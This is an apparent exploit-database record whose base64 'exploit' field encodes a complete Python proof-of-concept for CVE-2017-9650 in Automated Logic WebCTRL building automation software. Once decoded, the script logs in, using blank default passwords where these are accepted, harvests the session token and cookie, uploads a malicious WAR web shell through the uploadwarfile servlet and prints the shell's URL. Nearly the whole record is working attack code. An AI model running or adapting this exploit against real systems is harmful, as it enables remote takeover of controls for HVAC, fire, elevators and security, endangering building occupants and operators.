{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQojIC0qLSBjb2Rpbmc6IHV0ZjggLSotDQojDQojDQojIEF1dG9tYXRlZCBMb2dpYyBXZWJDVFJMIDYuNSBVbnJlc3RyaWN0ZWQgRmlsZSBVcGxvYWQgUmVtb3RlIENvZGUgRXhlY3V0aW9uDQojDQojDQojIFZlbmRvcjogQXV0b21hdGVkIExvZ2ljIENvcnBvcmF0aW9uDQojIFByb2R1Y3Qgd2ViIHBhZ2U6IGh0dHA6Ly93d3cuYXV0b21hdGVkbG9naWMuY29tDQojIEFmZmVjdGVkIHZlcnNpb246IEFMQyBXZWJDVFJMLCBpLVZ1LCBTaXRlU2NhbiBXZWIgNi41IGFuZCBwcmlvcg0KIyAgICAgICAgICAgICAgICAgICBBTEMgV2ViQ1RSTCwgU2l0ZVNjYW4gV2ViIDYuMSBhbmQgcHJpb3INCiMgICAgICAgICAgICAgICAgICAgQUxDIFdlYkNUUkwsIGktVnUgNi4wIGFuZCBwcmlvcg0KIyAgICAgICAgICAgICAgICAgICBBTEMgV2ViQ1RSTCwgaS1WdSwgU2l0ZVNjYW4gV2ViIDUuNSBhbmQgcHJpb3INCiMgICAgICAgICAgICAgICAgICAgQUxDIFdlYkNUUkwsIGktVnUsIFNpdGVTY2FuIFdlYiA1LjIgYW5kIHByaW9yDQojDQojIFN1bW1hcnk6IFdlYkNUUkzCriwgQXV0b21hdGVkIExvZ2ljJ3Mgd2ViLWJhc2VkIGJ1aWxkaW5nIGF1dG9tYXRpb24NCiMgc3lzdGVtLCBpcyBrbm93biBmb3IgaXRzIGludHVpdGl2ZSB1c2VyIGludGVyZmFjZSBhbmQgcG93ZXJmdWwgaW50ZWdyYXRpb24NCiMgY2FwYWJpbGl0aWVzLiBJdCBhbGxvd3MgYnVpbGRpbmcgb3BlcmF0b3JzIHRvIG9wdGltaXplIGFuZCBtYW5hZ2UNCiMgYWxsIG9mIHRoZWlyIGJ1aWxkaW5nIHN5c3RlbXMgLSBpbmNsdWRpbmcgSFZBQywgbGlnaHRpbmcsIGZpcmUsIGVsZXZhdG9ycywNCiMgYW5kIHNlY3VyaXR5IC0gYWxsIHdpdGhpbiBhIHNpbmdsZSBIVkFDIGNvbnRyb2xzIHBsYXRmb3JtLiBJdCdzIGV2ZXJ5dGhpbmcNCiMgdGhleSBuZWVkIHRvIGtlZXAgb2NjdXBhbnRzIGNvbWZvcnRhYmxlLCBtYW5hZ2UgZW5lcmd5IGNvbnNlcnZhdGlvbiBtZWFzdXJlcywNCiMgaWRlbnRpZnkga2V5IG9wZXJhdGlvbmFsIHByb2JsZW1zLCBhbmQgdmFsaWRhdGUgdGhlIHJlc3VsdHMuDQojDQojIERlc2M6IFdlYkNUUkwgc3VmZmVycyBmcm9tIGFuIGF1dGhlbnRpY2F0ZWQgYXJiaXRyYXJ5IGNvZGUgZXhlY3V0aW9uDQojIHZ1bG5lcmFiaWxpdHkuIFRoZSBpc3N1ZSBpcyBjYXVzZWQgZHVlIHRvIHRoZSBpbXByb3BlciB2ZXJpZmljYXRpb24NCiMgd2hlbiB1cGxvYWRpbmcgQWRkLW9uICguYWRkb25zIG9yIC53YXIpIGZpbGVzIHVzaW5nIHRoZSB1cGxvYWR3YXJmaWxlDQojIHNlcnZsZXQuIFRoaXMgY2FuIGJlIGV4cGxvaXRlZCB0byBleGVjdXRlIGFyYml0cmFyeSBjb2RlIGJ5IHVwbG9hZGluZw0KIyBhIG1hbGljaW91cyB3ZWIgYXJjaGl2ZSBmaWxlIHRoYXQgd2lsbCBydW4gYXV0b21hdGljYWxseSBhbmQgY2FuIGJlDQojIGFjY2Vzc2VkIGZyb20gd2l0aGluIHRoZSB3ZWJyb290IGRpcmVjdG9yeS4gQWRkaXRpb25hbHksIGFuIGltcHJvcGVyDQojIGF1dGhvcml6YXRpb24gYWNjZXNzIGNvbnRyb2wgb2NjdXJzIHdoZW4gdXNpbmcgdGhlICdhbm9ueW1vdXMnIHVzZXIuDQojIEJ5IHNwZWNpZmljYXRpb24sIHRoZSBhbm9ueW1vdXMgdXNlciBzaG91bGQgbm90IGhhdmUgcGVybWlzc2lvbnMgb3INCiMgYXV0aG9yaXphdGlvbiB0byB1cGxvYWQgb3IgaW5zdGFsbCBhZGQtb25zLiBJbiB0aGlzIGNhc2UsIHdoZW4gdXNpbmcNCiMgdGhlIGFub255bW91cyB1c2VyLCBhbiBhdHRhY2tlciBpcyBzdGlsbCBhYmxlIHRvIHVwbG9hZCBhIG1hbGljaW91cw0KIyBmaWxlIHZpYSBpbnNlY3VyZSBkaXJlY3Qgb2JqZWN0IHJlZmVyZW5jZSBhbmQgZXhlY3V0ZSBhcmJpdHJhcnkgY29kZS4NCiMgVGhlIGFub255bW91cyB1c2VyIHdhcyByZW1vdmVkIGZyb20gdmVyc2lvbiA2LjUgb2YgV2ViQ1RSTC4NCiMNCiMgVGVzdGVkIG9uOiBNaWNyb3NvZnQgV2luZG93cyA3IFByb2Zlc3Npb25hbCAoNi4xLjc2MDEgU2VydmljZSBQYWNrIDEgQnVpbGQgNzYwMSkNCiMgICAgICAgICAgICBBcGFjaGUtQ295b3RlLzEuMQ0KIyAgICAgICAgICAgIEFwYWNoZSBUb21jYXQvNy4wLjQyDQojICAgICAgICAgICAgQ0pTZXJ2ZXIvMS4xDQojICAgICAgICAgICAgSmF2YS8xLjcuMF8yNS1iMTcNCiMgICAgICAgICAgICBKYXZhIEhvdFNwb3QgU2VydmVyIFZNIDIzLjI1LWIwMQ0KIyAgICAgICAgICAgIEFudCAxLjcuMA0KIyAgICAgICAgICAgIEF4aXMgMS40DQojICAgICAgICAgICAgVHJvdmUgMi4wLjINCiMgICAgICAgICAgICBYYWxhbiBKYXZhIDIuNC4xDQojICAgICAgICAgICAgWGVyY2VzLUogMi42LjENCiMNCiMNCiMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcmVkIGJ5IEdqb2tvICdMaXF1aWRXb3JtJyBLcnN0aWMNCiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEB6ZXJvc2NpZW5jZQ0KIw0KIw0KIyBBZHZpc29yeSBJRDogWlNMLTIwMTctNTQzMQ0KIyBBZHZpc29yeSBVUkw6IGh0dHBzOi8vd3d3Lnplcm9zY2llbmNlLm1rL2VuL3Z1bG5lcmFiaWxpdGllcy9aU0wtMjAxNy01NDMxLnBocA0KIw0KIyBJQ1MtQ0VSVDogaHR0cHM6Ly9pY3MtY2VydC51cy1jZXJ0Lmdvdi9hZHZpc29yaWVzL0lDU0EtMTctMjM0LTAxDQojIENWRSBJRDogQ1ZFLTIwMTctOTY1MA0KIyBDVkUgVVJMOiBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMTctOTY1MA0KIw0KIw0KIyAzMC4wMS4yMDE3DQojDQojDQoNCmltcG9ydCBpdGVydG9vbHMNCmltcG9ydCBtaW1ldG9vbHMNCmltcG9ydCBtaW1ldHlwZXMNCmltcG9ydCBjb29raWVsaWINCmltcG9ydCBiaW5hc2NpaQ0KaW1wb3J0IHVybGxpYjINCmltcG9ydCB1cmxsaWINCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KaW1wb3J0IG9zDQoNCmZyb20gdXJsbGliMiBpbXBvcnQgVVJMRXJyb3INCmdsb2JhbCBiaW5kYXRhDQoNCl9fYXV0aG9yX18gPSAnbHF3cm0nDQoNCnBpdG9uID0gb3MucGF0aC5iYXNlbmFtZShzeXMuYXJndlswXSkNCg0KZGVmIGJhbm5lcmNoZSgpOg0KICBwcmludCAnJycNCiBALS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLUANCiB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiB8ICAgICAgICBXZWJDVFJMIDYuNSBBdXRoZW50aWNhdGVkIFJDRSBQb0MgICAgICAgIHwNCiB8ICAgICAgICAgICAgICAgSUQ6IFpTTC0yMDE3LTU0MzEgICAgICAgICAgICAgICAgIHwNCiB8ICAgICAgIENvcHlsZWZ0IChjKSAyMDE3LCBaZXJvIFNjaWVuY2UgTGFiICAgICAgIHwNCiB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCiBALS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLUANCiAgICAgICAgICAnJycNCiAgaWYgbGVuKHN5cy5hcmd2KSA8IDM6DQogICAgcHJpbnQgJ1srXSBVc2FnZTogJytwaXRvbisnIDxJUD4gPFdBUiBGSUxFPicNCiAgICBwcmludCAnWytdIEV4YW1wbGU6ICcrcGl0b24rJyAxMC4wLjAuMTcgd2Vic2hlbGwud2FyXG4nDQogICAgc3lzLmV4aXQoKQ0KDQpiYW5uZXJjaGUoKQ0KDQpob3N0ID0gc3lzLmFyZ3ZbMV0NCmZpbGVuYW1lID0gc3lzLmFyZ3ZbMl0NCg0Kd2l0aCBvcGVuKGZpbGVuYW1lLCAncmInKSBhcyBmOg0KICAgIGNvbnRlbnQgPSBmLnJlYWQoKQ0KaGV4byA9IGJpbmFzY2lpLmhleGxpZnkoY29udGVudCkNCmJpbmRhdGEgPSBiaW5hc2NpaS51bmhleGxpZnkoaGV4bykNCg0KY2ogPSBjb29raWVsaWIuQ29va2llSmFyKCkNCm9wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHVybGxpYjIuSFRUUENvb2tpZVByb2Nlc3NvcihjaikpDQp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG9wZW5lcikNCg0KcHJpbnQgJ1srXSBQcm9iaW5nIHRhcmdldCBodHRwOi8vJytob3N0DQoNCnRyeToNCiAgY2hlY2tob3N0ID0gb3BlbmVyLm9wZW4oJ2h0dHA6Ly8nK2hvc3QrJy9pbmRleC5qc3A/b3BlcmF0b3Jsb2NhbGU9ZW4nKQ0KZXhjZXB0IHVybGxpYjIuSFRUUEVycm9yLCBlcnJvcnppbzoNCiAgaWYgZXJyb3J6aW8uY29kZSA9PSA0MDQ6DQogICAgcHJpbnQgJ1shXSBFcnJvciAwMDE6Jw0KICAgIHByaW50ICdbLV0gQ2hlY2sgeW91ciB0YXJnZXQhJw0KICAgIHByaW50DQogICAgc3lzLmV4aXQoKQ0KZXhjZXB0IFVSTEVycm9yLCBlcnJvcnppb2N2YWo6DQogIGlmIGVycm9yemlvY3Zhai5yZWFzb246DQogICAgcHJpbnQgJ1shXSBFcnJvciAwMDI6Jw0KICAgIHByaW50ICdbLV0gQ2hlY2sgeW91ciB0YXJnZXQhJw0KICAgIHByaW50DQogICAgc3lzLmV4aXQoKQ0KDQpwcmludCAnWytdIFRhcmdldCBzZWVtcyBPSy4nDQpwcmludCAnWytdIExvZ2luIHBsZWFzZTonDQoNCnByaW50ICcnJw0KRGVmYXVsdCB1c2VybmFtZTogQWRtaW5pc3RyYXRvciwgQW5vbnltb3VzDQpEZWZhdWx0IHBhc3N3b3JkOiAoYmxhbmspLCAoYmxhbmspDQonJycNCg0KdXNlcm5hbWUgPSByYXdfaW5wdXQoJ1sqXSBFbnRlciB1c2VybmFtZTogJykNCnBhc3N3b3JkID0gcmF3X2lucHV0KCdbKl0gRW50ZXIgcGFzc3dvcmQ6ICcpDQoNCmxvZ2luX2RhdGEgPSB1cmxsaWIudXJsZW5jb2RlKHsncGFzcyc6cGFzc3dvcmQsICduYW1lJzp1c2VybmFtZSwgJ3RvdWNoc2NyJzonZmFsc2UnfSkNCg0Kb3BlbmVyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgJ1Rocml6aWxsYS8zMy45JyldDQpsb2dpbiA9IG9wZW5lci5vcGVuKCdodHRwOi8vJytob3N0KycvP2xhbmd1YWdlPWVuJywgbG9naW5fZGF0YSkNCmF1dGggPSBsb2dpbi5yZWFkKCkNCg0KaWYgcmUuc2VhcmNoKHIncHJvZHVjdE5hbWUgPSBcJ1dlYkNUUkwnLCBhdXRoKToNCiAgcHJpbnQgJ1srXSBBdXRoZW50aWNhdGVkIScNCiAgdG9rZW4gPSByZS5zZWFyY2goJ3dicz0oLis/KSYnLCBhdXRoKS5ncm91cCgxKQ0KICBwcmludCAnWytdIEdvdCB3YnMgdG9rZW46ICcrdG9rZW4NCiAgY29va2llMSwgY29va2llMiA9IFtzdHIoYykgZm9yIGMgaW4gY2pdDQogIGNvb2tpZSA9IGNvb2tpZTFbODo1MV0NCiAgcHJpbnQgJ1srXSBHb3QgY29va2llOiAnK2Nvb2tpZQ0KZWxzZToNCiAgcHJpbnQgJ1stXSBJbmNvcnJlY3QgdXNlcm5hbWUgb3IgcGFzc3dvcmQuJw0KICBwcmludA0KICBzeXMuZXhpdCgpDQoNCnByaW50ICdbK10gU2VuZGluZyBwYXlsb2FkLicNCg0KY2xhc3MgTXVsdGlQYXJ0Rm9ybShvYmplY3QpOg0KDQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmZvcm1fZmllbGRzID0gW10NCiAgICAgICAgc2VsZi5maWxlcyA9IFtdDQogICAgICAgIHNlbGYuYm91bmRhcnkgPSBtaW1ldG9vbHMuY2hvb3NlX2JvdW5kYXJ5KCkNCiAgICAgICAgcmV0dXJuDQogICAgDQogICAgZGVmIGdldF9jb250ZW50X3R5cGUoc2VsZik6DQogICAgICAgIHJldHVybiAnbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JXMnICUgc2VsZi5ib3VuZGFyeQ0KDQogICAgZGVmIGFkZF9maWVsZChzZWxmLCBuYW1lLCB2YWx1ZSk6DQogICAgICAgIHNlbGYuZm9ybV9maWVsZHMuYXBwZW5kKChuYW1lLCB2YWx1ZSkpDQogICAgICAgIHJldHVybg0KDQogICAgZGVmIGFkZF9maWxlKHNlbGYsIGZpZWxkbmFtZSwgZmlsZW5hbWUsIGZpbGVIYW5kbGUsIG1pbWV0eXBlPU5vbmUpOg0KICAgICAgICBib2R5ID0gZmlsZUhhbmRsZS5yZWFkKCkNCiAgICAgICAgaWYgbWltZXR5cGUgaXMgTm9uZToNCiAgICAgICAgICAgIG1pbWV0eXBlID0gbWltZXR5cGVzLmd1ZXNzX3R5cGUoZmlsZW5hbWUpWzBdIG9yICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nDQogICAgICAgIHNlbGYuZmlsZXMuYXBwZW5kKChmaWVsZG5hbWUsIGZpbGVuYW1lLCBtaW1ldHlwZSwgYm9keSkpDQogICAgICAgIHJldHVybg0KICAgIA0KICAgIGRlZiBfX3N0cl9fKHNlbGYpOg0KDQogICAgICAgIHBhcnRzID0gW10NCiAgICAgICAgcGFydF9ib3VuZGFyeSA9ICctLScgKyBzZWxmLmJvdW5kYXJ5DQogICAgICAgIA0KICAgICAgICBwYXJ0cy5leHRlbmQoDQogICAgICAgICAgICBbIHBhcnRfYm91bmRhcnksDQogICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IiVzIicgJSBuYW1lLA0KICAgICAgICAgICAgICAnJywNCiAgICAgICAgICAgICAgdmFsdWUsDQogICAgICAgICAgICBdDQogICAgICAgICAgICBmb3IgbmFtZSwgdmFsdWUgaW4gc2VsZi5mb3JtX2ZpZWxkcw0KICAgICAgICAgICAgKQ0KICAgICAgICANCiAgICAgICAgcGFydHMuZXh0ZW5kKA0KICAgICAgICAgICAgWyBwYXJ0X2JvdW5kYXJ5LA0KICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogZmlsZTsgbmFtZT0iJXMiOyBmaWxlbmFtZT0iJXMiJyAlIFwNCiAgICAgICAgICAgICAgICAgKGZpZWxkX25hbWUsIGZpbGVuYW1lKSwNCiAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZTogJXMnICUgY29udGVudF90eXBlLA0KICAgICAgICAgICAgICAnJywNCiAgICAgICAgICAgICAgYm9keSwNCiAgICAgICAgICAgIF0NCiAgICAgICAgICAgIGZvciBmaWVsZF9uYW1lLCBmaWxlbmFtZSwgY29udGVudF90eXBlLCBib2R5IGluIHNlbGYuZmlsZXMNCiAgICAgICAgICAgICkNCiAgICAgICAgDQogICAgICAgIGZsYXR0ZW5lZCA9IGxpc3QoaXRlcnRvb2xzLmNoYWluKCpwYXJ0cykpDQogICAgICAgIGZsYXR0ZW5lZC5hcHBlbmQoJy0tJyArIHNlbGYuYm91bmRhcnkgKyAnLS0nKQ0KICAgICAgICBmbGF0dGVuZWQuYXBwZW5kKCcnKQ0KICAgICAgICByZXR1cm4gJ1xyXG4nLmpvaW4oZmxhdHRlbmVkKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIGZvcm0gPSBNdWx0aVBhcnRGb3JtKCkNCiAgICBmb3JtLmFkZF9maWVsZCgnd2JzJywgdG9rZW4pDQogICAgZm9ybS5hZGRfZmllbGQoJ2ZpbGUiOyBmaWxlbmFtZT0iJytmaWxlbmFtZSwgYmluZGF0YSkNCiAgICByZXF1ZXN0ID0gdXJsbGliMi5SZXF1ZXN0KCdodHRwOi8vJytob3N0KycvX2NvbW1vbi9zZXJ2bGV0L2x2bDUvdXBsb2Fkd2FyZmlsZScpDQogICAgcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLWFnZW50JywgJ1NDQURBLzguMCcpDQogICAgYm9keSA9IHN0cihmb3JtKQ0KICAgIHJlcXVlc3QuYWRkX2hlYWRlcignQ29udGVudC10eXBlJywgZm9ybS5nZXRfY29udGVudF90eXBlKCkpDQogICAgcmVxdWVzdC5hZGRfaGVhZGVyKCdDb29raWUnLCBjb29raWUpDQogICAgcmVxdWVzdC5hZGRfaGVhZGVyKCdDb250ZW50LWxlbmd0aCcsIGxlbihib2R5KSkNCiAgICByZXF1ZXN0LmFkZF9kYXRhKGJvZHkpDQogICAgcmVxdWVzdC5nZXRfZGF0YSgpDQogICAgdXJsbGliMi51cmxvcGVuKHJlcXVlc3QpLnJlYWQoKQ0KDQpwcmludCAnWytdIFBheWxvYWQgdXBsb2FkZWQuJw0KcHJpbnQgJ1srXSBTaGVsbCBhdmFpbGFibGUgYXQ6IGh0dHA6Ly8nK2hvc3QrJy8nK2ZpbGVuYW1lWzotNF0NCnByaW50DQoNCnN5cy5leGl0KCkNCg==", 
    "filename": "platforms/java/webapps/42544.py", 
    "id": "42544", 
    "cves": [
        "CVE-2017-9650"
    ]
}